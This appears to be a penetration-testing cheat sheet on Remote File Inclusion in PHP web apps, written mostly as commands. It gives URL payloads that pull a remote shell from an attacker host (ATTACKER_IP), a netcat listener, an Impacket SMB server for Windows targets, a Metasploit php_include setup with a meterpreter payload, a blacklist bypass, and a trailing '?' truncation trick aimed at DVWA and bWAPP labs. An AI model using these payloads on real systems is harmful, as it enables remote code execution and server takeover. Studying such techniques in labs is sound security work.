# Remote File Inclusion (RFI)

### Allows an attacker to inject external URL in a vulnerable backend PHP/Python/etc. function.

### Example: 

#### 1: Host payload in an http server then setup a listener.

#### 2: 

    http://site.com/index.php?file=http://ATTACKER_IP/shell.php

#### 3: Enjoy your shell!

### TIP: If you detect an LFI vulnerability on a windows host, try to check if you can send files over SMB to the server like:

#### 1) 

    nc -lvnp PORT (Setup listener)

#### 2) Set up an SMB Server with Impacket, then transfer the file 

    impacket-smbserver –smb2support sharepath /root/Desktop/Shells

    http://site.com/index.php?file=\\ATTACKER_IP\\FILE.php

## Alternate Method: Metasploit

    msf > use exploit/unix/webapp/php_include
    set payload php/meterpreter/bind_tcp
    set RHOST 192.168.0.2
    set PATH /DVWA/vulnerabilities/fi/
    set HEADERS " Cookie: security=low; PHPSESSID=4536da6h54ski6ftv09gdq35ik"
    exploit

# Blacklist Bypass

To bypass this implemented blacklist, we need to try all the different combinations like

    “HTTP:” or “hTTp:” or "HTTPS"

# Null Byte

Go for the Null Byte Attack, using up the question mark [?] character. Which will thus neutralize the problem of the “.php”, forcing the php server to ignore everything after that, as soon as it is interpreted.

    192.168.0.3/bWAPP/rlfi.php?language=http://192.168.0.5:8000/tryme.txt?


